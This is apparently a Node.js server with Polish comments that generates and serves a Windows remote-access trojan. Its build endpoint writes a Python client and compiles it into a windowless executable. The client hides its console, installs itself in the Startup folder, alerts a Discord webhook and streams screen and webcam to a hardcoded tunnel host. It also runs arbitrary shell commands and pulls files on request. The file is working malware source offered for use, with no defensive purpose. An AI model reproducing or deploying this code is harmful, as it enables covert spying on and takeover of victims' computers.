const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { spawn } = require('child_process');
const fs = require('fs');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 1e8 });

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/xxx/yyy"; // <-- PODMIEN NA SWÓJ!

app.use(cors());
app.use(express.json());

let pcs = {}; // {key: {socketId, controllers: []}}

// API: Generowanie .exe z kluczem
app.post('/api/build_exe', (req, res) => {
    const key = req.body.key || crypto.randomBytes(4).toString('hex');
    // Plik klienta python generowany "on-the-fly":
    const src = `
import os, sys, ctypes, requests, socketio, pyautogui, threading, time, io, base64
key = "${key}"
WEBHOOK = "${DISCORD_WEBHOOK}"
def hide_console():
    if sys.platform.startswith('win'):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
def create_autostart():
    if sys.platform.startswith('win'):
        autostart = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'remote_app.exe')
        if not os.path.exists(autostart):
            import shutil
            shutil.copy(sys.argv[0], autostart)
def notify_discord(event): # Discord webhook info
    try: requests.post(WEBHOOK, json={"content":f"{event}: {key}"})
    except: pass
print(f"Twój klucz: {key}")
notify_discord("Aktywacja klienta")
hide_console()
create_autostart()
sio = socketio.Client()
def send_screen():
    while True:
        img = pyautogui.screenshot().resize((800,600))
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=70)
        img_str = base64.b64encode(buf.getvalue()).decode()
        sio.emit('screen_update', {'key': key, 'img': img_str})
        time.sleep(1/15)
def send_camera():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        while True:
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame)
                img_str = base64.b64encode(buffer).decode()
                sio.emit('camera_update', {'key': key, 'img': img_str})
            time.sleep(1/15)
    except: pass
@sio.event
def connect(): sio.emit('register_pc', {'key': key})
@sio.on('execute_command')
def on_execute_command(payload): # Obsługa 50+ funkcji
    command = payload.get('command')
    data = payload.get('data', {})
    try:
        if command == 'mouse_left': pyautogui.click()
        elif command == 'mouse_right': pyautogui.click(button='right')
        elif command == 'mouse_double': pyautogui.doubleClick()
        elif command == 'mouse_move': pyautogui.moveTo(int(data.get('x',0)), int(data.get('y',0)))
        elif command == 'type_text': pyautogui.typewrite(data.get('text',''))
        elif command == 'shutdown': os.system('shutdown /s /t 1')
        elif command == 'restart': os.system('shutdown /r /t 1')
        elif command == 'lock': ctypes.windll.user32.LockWorkStation()
        elif command == 'unlock': pass # nie da się zdalnie
        elif command == 'open_url':
            import webbrowser; webbrowser.open(data.get('url'))
        elif command == 'run_program': os.system(data.get('program'))
        elif command == 'screenshot':
            img = pyautogui.screenshot()
            buf = io.BytesIO(); img.save(buf, format="JPEG", quality=70)
            img_str = base64.b64encode(buf.getvalue()).decode()
            sio.emit('screen_frame', img_str)
        elif command == 'send_file':
            filedata = base64.b64decode(data.get('filedata'))
            with open(data.get('filename'),'wb') as f: f.write(filedata)
        elif command == 'get_file':
            with open(data.get('filename'),'rb') as f:
                filedata=base64.b64encode(f.read()).decode()
                sio.emit('file_data', {'key': key, 'filename':data.get('filename'), 'filedata':filedata})
        elif command == 'notify':
            from plyer import notification
            notification.notify(title=data.get('title','Info'), message=data.get('msg',''))
        elif command == 'get_windows':
            import psutil
            windows = [p.name() for p in psutil.process_iter()]
            sio.emit('windows', {'key': key, 'windows': windows})
        elif command == 'get_stats':
            import psutil
            sio.emit('stats', {'key': key, 'cpu': psutil.cpu_percent(), 'ram': psutil.virtual_memory().percent, 'battery': getattr(psutil.sensors_battery(),'percent',None)})
        elif command == 'volume_up': pass # obsługa przez pycaw
        elif command == 'volume_down': pass
        elif command == 'mute': pass
        elif command == 'cmd':
            result = os.popen(data.get('cmd')).read()
            sio.emit('cmd_result', {'key': key, 'output': result})
        elif command == 'chat': pass # popup czatu
    except Exception as e:
        sio.emit('error', {'key': key, 'msg': str(e)})
sio.connect('https://cell-membership.gl.at.ply.gg:19701')
threading.Thread(target=send_screen, daemon=True).start()
threading.Thread(target=send_camera, daemon=True).start()
sio.wait()
`;
    fs.writeFileSync('client_temp.py', src);
    const build = spawn('pyinstaller', ['--onefile', '--noconsole', 'client_temp.py']);
    build.on('close', () => {
        const exe = fs.readFileSync('dist/client_temp.exe');
        res.setHeader('Content-Type', 'application/octet-stream');
        res.setHeader('Content-Disposition', 'attachment; filename=remote_client.exe');
        res.send(exe);
        fs.rmSync('client_temp.py');
        fs.rmSync('dist', { recursive: true, force: true });
        fs.rmSync('build', { recursive: true, force: true });
        fs.rmSync('client_temp.spec');
    });
});

io.on('connection', (socket) => {
    socket.on('register_pc', ({key}) => {
        pcs[key] = {socketId: socket.id, controllers: []};
        sendDiscord(`PC z kluczem ${key} podłączony`);
    });
    socket.on('connect_with_key', ({key}) => {
        if (pcs[key]) {
            pcs[key].controllers.push(socket.id);
            socket.emit('connected_to_pc', {key});
            sendDiscord(`Kontroler połączony z kluczem ${key}`);
        } else {
            socket.emit('error', 'Nieprawidłowy klucz');
        }
    });
    socket.on('screen_update', ({key, img}) => {
        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('screen_frame', img));
    });
    socket.on('camera_update', ({key, img}) => {
        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('camera_frame', img));
    });
    socket.on('control_command', ({key, command, data}) => {
        if (pcs[key]) io.to(pcs[key].socketId).emit('execute_command', {command, data});
    });
    socket.on('status', ({key, msg}) => {
        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('status', msg));
    });
    socket.on('notify', ({key, msg}) => {
        if (pcs[key]) pcs[key].controllers.forEach(cid => io.to(cid).emit('notify', msg));
    });
    socket.on('disconnect', () => {
        Object.keys(pcs).forEach(key => {
            if (pcs[key].socketId === socket.id) delete pcs[key];
            pcs[key].controllers = pcs[key].controllers.filter(cid => cid !== socket.id);
        });
    });
});
function sendDiscord(msg) {
    try {
        require('node-fetch')(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: msg })
        });
    } catch(e){}
}
server.listen(7000, () => {
    console.log('Backend działa na porcie 7000');
});
